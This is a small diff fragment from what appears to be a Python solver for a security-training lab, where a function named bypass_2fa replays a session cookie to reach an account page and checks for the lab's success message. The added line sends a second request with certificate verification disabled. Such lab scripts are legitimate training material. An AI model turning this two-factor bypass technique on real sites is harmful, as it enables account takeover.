@@ -47,6 +47,7 @@ def bypass_2fa(s, url):
         headers = {
             "Cookie": "session=" + session
         }
+        s.get(url + account, verify=False, headers=headers)
         r1 = s.get(url + account, verify=False, headers=headers)
         # verify the response contains Congratulations, you solved the lab!
         if (b'Congratulations, you solved the lab!' in r1.content):
